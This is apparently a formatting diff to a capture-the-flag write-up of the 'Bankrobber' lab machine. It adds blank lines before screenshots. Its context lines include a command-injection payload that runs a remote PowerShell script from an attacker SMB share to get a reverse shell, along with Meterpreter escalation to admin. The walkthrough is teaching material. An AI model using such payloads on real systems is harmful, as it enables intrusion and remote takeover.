@@ -16,6 +16,7 @@ nmap -sV -sT -sC -p- -o nmapinitial -T4 10.10.10.154
 ```
 The nmap scan finds the following opened ports 80, 443, 445, and 3306.
 Port 3306 appears to be filtering by IP.
+
 ![nmapinitial](/assets/images/HTB/Bankrobber/nmapinitial.jpg)
 
 enum4linux didn't return anything that i could use further.
@@ -136,6 +137,7 @@ dirfail || powershell -exec bypass -f \\\\10.10.14.51\\test\\shellme.ps1
 Since "dirfail" will just fail to do anything, it will then pass to call on PowerShell to execute the shellme.ps1 script while allso temporarily bypassing the PowerShell execution policy (that usually stops scripts from executing).
 
 Shortly after the request from Burp goes through, the smb file share gets a connection from the webserver.
+
 ![smbshare](/assets/images/HTB/Bankrobber/smbshare.jpg)
 
 And then the previously started ncat listener catches the reverse shell conenction.
@@ -174,6 +176,7 @@ And got a Meterpreter session in Metasploit
 ![metasploit](/assets/images/HTB/Bankrobber/metasploit.jpg)
 
 I configured the port tunnel.
+
 ![porttunnel](/assets/images/HTB/Bankrobber/porttunnel.jpg)
 
 And then used ncat to connect to the port that bankv2.exe was listening on.
@@ -205,4 +208,5 @@ And got a Meterpreter shell with admin privileges.
 ![adminmeterpreter](/assets/images/HTB/Bankrobber/adminmeterpreter.jpg)
 
 Which I then used to get the root flag.
+
 ![rootflag](/assets/images/HTB/Bankrobber/rootflag.jpg)
